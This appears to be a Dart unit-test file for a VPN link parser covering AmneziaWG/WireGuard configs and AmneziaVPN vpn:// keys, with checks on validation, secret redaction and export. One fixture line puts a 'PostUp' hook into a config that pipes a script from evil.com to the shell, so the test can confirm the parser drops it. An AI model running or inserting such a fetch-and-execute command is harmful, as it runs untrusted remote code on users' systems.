import 'dart:convert';
import 'dart:io' show zlib;

import 'package:smv_link_parser/smv_link_parser.dart';
import 'package:test/test.dart';

const k1 = 'BwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwA=';
const k2 = 'CAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAE=';
const k3 = 'CQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQI=';

const awg2Conf = '''
[Interface]
PrivateKey = $k1
Address = 10.8.1.2/32, fd00::2/128
DNS = 1.1.1.1, 1.0.0.1
MTU = 1280
Jc = 4
Jmin = 40
Jmax = 70
S1 = 52
S2 = 120
S3 = 32
S4 = 16
H1 = 1318795025-1318795156
H2 = 2000000000-2000000100
H3 = 3000000000-3000000100
H4 = 4000000000-4000000100
I1 = <b 0xc70000000108ce1bf31eec7d><r 16><t>
PostUp = curl https://example.com/evil.sh | sh

[Peer]
PublicKey = $k2
PresharedKey = $k3
AllowedIPs = 0.0.0.0/0, ::/0
Endpoint = 203.0.113.10:51820
PersistentKeepalive = 25
''';

const parser = LinkParser();

/// Ключ в формате AmneziaVPN: vpn:// + base64url(qCompress(JSON)).
String vpnKey(Map<String, Object?> json) {
  final raw = utf8.encode(jsonEncode(json));
  final header = [
    (raw.length >> 24) & 0xff,
    (raw.length >> 16) & 0xff,
    (raw.length >> 8) & 0xff,
    raw.length & 0xff,
  ];
  final data = [...header, ...zlib.encode(raw)];
  return 'vpn://${base64Url.encode(data).replaceAll('=', '')}';
}

ProxyNode single(String input, {SourceType st = SourceType.uri}) {
  final r = parser.parse(input, sourceType: st);
  expect(r.issues, isEmpty, reason: r.issues.join('\n'));
  expect(r.nodes, hasLength(1));
  return r.nodes.single;
}

Map<String, Object?> essence(ProxyNode n) =>
    n.toJson()..remove('id')..remove('source');

List<ValidationCode> errors(ProxyNode n) =>
    validateNode(n).where((i) => i.isError).map((i) => i.code).toList();

void main() {
  group('AmneziaWG .conf', () {
    test('AWG 2.0: все параметры, H-диапазоны, I1', () {
      final r = parser.parse(awg2Conf, sourceType: SourceType.qr);
      expect(r.format, InputFormat.wireguardConf);
      final n = r.nodes.single;
      expect(n.protocol, ProxyProtocol.amneziawg);
      expect(n.server, '203.0.113.10');
      expect(n.port, 51820);
      expect(n.source.type, SourceType.qr);
      final wg = n.wireguard!;
      expect(wg.privateKey, k1);
      expect(wg.peerPublicKey, k2);
      expect(wg.presharedKey, k3);
      expect(wg.addresses, ['10.8.1.2/32', 'fd00::2/128']);
      expect(wg.dns, ['1.1.1.1', '1.0.0.1']);
      expect(wg.mtu, 1280);
      expect(wg.persistentKeepalive, 25);
      final a = wg.awg!;
      expect([a.jc, a.jmin, a.jmax, a.s1, a.s2, a.s3, a.s4],
          [4, 40, 70, 52, 120, 32, 16]);
      expect(a.h1, '1318795025-1318795156');
      expect(a.i1, '<b 0xc70000000108ce1bf31eec7d><r 16><t>');
      expect(a.version, '2.0');
      // PostUp — shell-команда: не сохраняется и не экспортируется.
      expect(a.extra, isEmpty);
      expect(nodeToWgConf(n), isNot(contains('PostUp')));
      expect(validateNode(n).where((i) => i.isError), isEmpty);
    });

    test('обычный WireGuard', () {
      final n = single('''
[Interface]
PrivateKey = $k1
Address = 10.0.0.2/32

[Peer]
PublicKey = $k2
Endpoint = [2001:db8::5]:51820
''');
      expect(n.protocol, ProxyProtocol.wireguard);
      expect(n.wireguard!.awg, isNull);
      expect(n.server, '2001:db8::5');
      expect(n.wireguard!.allowedIps, ['0.0.0.0/0', '::/0']);
      expect(n.name, 'WireGuard [2001:db8::5]:51820');
    });

    test('AWG 3.x: неизвестные ключи сохраняются и экспортируются', () {
      final n = single('''
[Interface]
PrivateKey = $k1
Address = 10.0.0.2/32
Jc = 3
Jmin = 10
Jmax = 50
S1 = 12
S2 = 12
S3 = 12
S4 = 12
H1 = 1
H2 = 2
H3 = 3
H4 = 4
HeaderProtectionKey = abc123
[Peer]
PublicKey = $k2
Endpoint = vpn.example.com:443
''');
      final a = n.wireguard!.awg!;
      expect(a.extra, {'HeaderProtectionKey': 'abc123'});
      expect(a.version, '3+');
      expect(nodeToWgConf(n), contains('HeaderProtectionKey = abc123'));
      expect(validateNode(n).map((i) => i.code),
          contains(ValidationCode.awgUnknownParams));
    });

    test('экспорт .conf → разбор даёт тот же узел', () {
      final a = single(awg2Conf);
      final conf = nodeToUri(a);
      expect(conf, startsWith('[Interface]'));
      expect(essence(single(conf)), essence(a));
      expect(shareUri(a), conf, reason: 'raw многострочный — собираем заново');
      expect(containsSecrets(a), isTrue);
    });

    test('ошибки: нет Peer, нет PrivateKey, битый Jc', () {
      expect(parser.parse('[Interface]\nPrivateKey = $k1\n').issues.single.code,
          ParseErrorCode.missingField);
      expect(
          parser
              .parse('[Interface]\nAddress = 10.0.0.2/32\n[Peer]\n'
                  'PublicKey = $k2\nEndpoint = 1.2.3.4:1\n')
              .issues
              .single
              .message,
          contains('PrivateKey'));
      expect(
          parser
              .parse('[Interface]\nPrivateKey = $k1\nJc = много\n[Peer]\n'
                  'PublicKey = $k2\nEndpoint = 1.2.3.4:1\n')
              .issues
              .single
              .code,
          ParseErrorCode.malformed);
    });

    test('валидация параметров обфускации', () {
      final n = single(awg2Conf
          .replaceFirst('S2 = 120', 'S2 = 108') // S1 + 56
          .replaceFirst('Jmax = 70', 'Jmax = 30') // Jmin > Jmax
          .replaceFirst('H2 = 2000000000-2000000100',
              'H2 = 1318795100-1318795200') // пересекается с H1
          .replaceFirst('PrivateKey = $k1', 'PrivateKey = short'));
      expect(
          errors(n),
          containsAll([
            ValidationCode.awgInvalidPadding,
            ValidationCode.awgInvalidJunk,
            ValidationCode.awgInvalidHeaders,
            ValidationCode.invalidKey,
          ]));
    });

    test('toRedactedJson скрывает ключи', () {
      final s = jsonEncode(single(awg2Conf).toRedactedJson());
      expect(s, isNot(contains(k1)));
      expect(s, isNot(contains(k3)));
      expect(s, contains(k2)); // публичный ключ сервера — не секрет
    });
  });

  group('AmneziaVPN vpn://', () {
    final awgKey = vpnKey({
      'containers': [
        {
          'container': 'amnezia-awg',
          'awg': {
            'last_config': jsonEncode({
              'config': '[Interface]\n'
                  'Address = 10.8.1.3/32\n'
                  r'DNS = $PRIMARY_DNS, $SECONDARY_DNS'
                  '\n'
                  'PrivateKey = $k1\n'
                  'Jc = 3\nJmin = 10\nJmax = 50\nS1 = 89\nS2 = 77\n'
                  'H1 = 1234\nH2 = 5678\nH3 = 9012\nH4 = 3456\n\n'
                  '[Peer]\nPublicKey = $k2\nPresharedKey = $k3\n'
                  'AllowedIPs = 0.0.0.0/0, ::/0\n'
                  'Endpoint = 198.51.100.7:47000\n'
                  'PersistentKeepalive = 25\n',
              'hostName': '198.51.100.7',
              'port': 47000,
              'mtu': '1280',
            }),
            'port': '47000',
            'transport_proto': 'udp',
          },
        }
      ],
      'defaultContainer': 'amnezia-awg',
      'description': 'Мой сервер',
      'dns1': '9.9.9.9',
      'dns2': '149.112.112.112',
      'hostName': '198.51.100.7',
    });

    test('ключ с контейнером amnezia-awg', () {
      final r = parser.parse(awgKey);
      expect(r.format, InputFormat.amneziaKey);
      expect(r.issues, isEmpty, reason: r.issues.join('\n'));
      final n = r.nodes.single;
      expect(n.protocol, ProxyProtocol.amneziawg);
      expect(n.name, 'Мой сервер');
      expect(n.server, '198.51.100.7');
      expect(n.port, 47000);
      expect(n.wireguard!.dns, ['9.9.9.9', '149.112.112.112']);
      expect(n.wireguard!.mtu, 1280);
      expect(n.wireguard!.awg!.s1, 89);
      expect(n.wireguard!.awg!.version, '1.0');
      expect(n.source.raw, awgKey);
      expect(shareUri(n), awgKey, reason: 'QR отдаёт исходный ключ Amnezia');
      expect(validateNode(n).where((i) => i.isError), isEmpty);
    });

    test('ключ с padding, пробелами и переводом строки (из файла .vpn)', () {
      final body = awgKey.substring(6);
      final padded = body.padRight(body.length + (4 - body.length % 4) % 4, '=');
      expect(parser.parse('  vpn://$padded\r\n').nodes, hasLength(1));
      expect(parser.parse('VPN://$body').nodes, hasLength(1));
    });

    test('старый формат: поля вместо INI', () {
      final key = vpnKey({
        'containers': [
          {
            'container': 'amnezia-awg',
            'awg': {
              'last_config': jsonEncode({
                'client_priv_key': k1,
                'server_pub_key': k2,
                'psk_key': k3,
                'client_ip': '10.8.1.4',
                'hostName': 'awg.example.com',
                'port': '40000',
                'Jc': '2',
                'Jmin': '10',
                'Jmax': '50',
                'S1': '20',
                'S2': '30',
                'H1': '11',
                'H2': '22',
                'H3': '33',
                'H4': '44',
              }),
            },
          }
        ],
        'hostName': 'awg.example.com',
      });
      final n = single(key);
      expect(n.server, 'awg.example.com');
      expect(n.port, 40000);
      expect(n.wireguard!.addresses, ['10.8.1.4/32']);
      expect(n.wireguard!.dns, ['1.1.1.1', '1.0.0.1']);
      expect(n.wireguard!.awg!.h4, '44');
      expect(n.name, 'awg.example.com');
    });

    test('несколько контейнеров: XRay + OpenVPN', () {
      final key = vpnKey({
        'containers': [
          {
            'container': 'amnezia-xray',
            'xray': {
              'last_config': jsonEncode({
                'inbounds': [
                  {'protocol': 'socks', 'port': 10808}
                ],
                'outbounds': [
                  {
                    'protocol': 'vless',
                    'settings': {
                      'vnext': [
                        {
                          'address': '198.51.100.7',
                          'port': 443,
                          'users': [
                            {
                              'id': 'b831381d-6324-4d53-ad4f-8cda48b30811',
                              'encryption': 'none',
                              'flow': 'xtls-rprx-vision'
                            }
                          ]
                        }
                      ]
                    },
                    'streamSettings': {
                      'network': 'tcp',
                      'security': 'reality',
                      'realitySettings': {
                        'serverName': 'www.googletagmanager.com',
                        'publicKey': 'jNXHt1yRo0vDuchQlIP6Z0ZvjT3KtzVI-T4E7RoLJS0',
                        'shortId': 'ab',
                        'fingerprint': 'chrome',
                      },
                    },
                  }
                ],
              }),
            },
          },
          {
            'container': 'amnezia-openvpn',
            'openvpn': {'last_config': '{"config": "client\\ndev tun"}'},
          },
        ],
        'description': 'Сервер',
      });
      final r = parser.parse(key);
      expect(r.nodes, hasLength(1));
      final n = r.nodes.single;
      expect(n.protocol, ProxyProtocol.vless);
      expect(n.name, 'Сервер (XRay)');
      expect(n.security.type, 'reality');
      expect(n.source.raw, key);
      expect(r.issues.single.code, ParseErrorCode.unsupportedProtocol);
      expect(r.issues.single.kind, 'amnezia:openvpn');
      expect(r.issues.single.index, 1);
    });

    test('ключ Amnezia Premium/Free — понятная ошибка', () {
      final r = parser.parse(vpnKey({
        'config_version': 1.0,
        'api_endpoint': 'https://example.com/api/v1/request/awg/',
        'protocol': 'awg',
        'name': 'AmneziaFree',
        'api_key': 'secret-api-key',
      }));
      expect(r.nodes, isEmpty);
      expect(r.issues.single.code, ParseErrorCode.unsupportedProtocol);
      expect(r.issues.single.kind, 'amnezia:api');
      expect(r.issues.single.toString(), isNot(contains('secret-api-key')));
    });

    test('битый ключ', () {
      final r = parser.parse('vpn://not-a-valid-key');
      expect(r.issues.single.code, ParseErrorCode.malformed);
    });

    test('JSON Amnezia без vpn:// (содержимое .vpn/.json)', () {
      final json = utf8.decode(zlib.decode(
          base64Url.decode(base64Url.normalize(awgKey.substring(6))).sublist(4)));
      final r = parser.parse(json, sourceType: SourceType.file);
      expect(r.format, InputFormat.amneziaKey);
      expect(r.nodes.single.protocol, ProxyProtocol.amneziawg);
    });

    test('vpn:// в списке вместе с обычными ссылками', () {
      final r = parser.parse('$awgKey\n'
          'trojan://pw@t.example.com:443#T');
      expect(r.format, InputFormat.uriList);
      expect(r.nodes.map((n) => n.protocol),
          [ProxyProtocol.amneziawg, ProxyProtocol.trojan]);
    });
  });
}
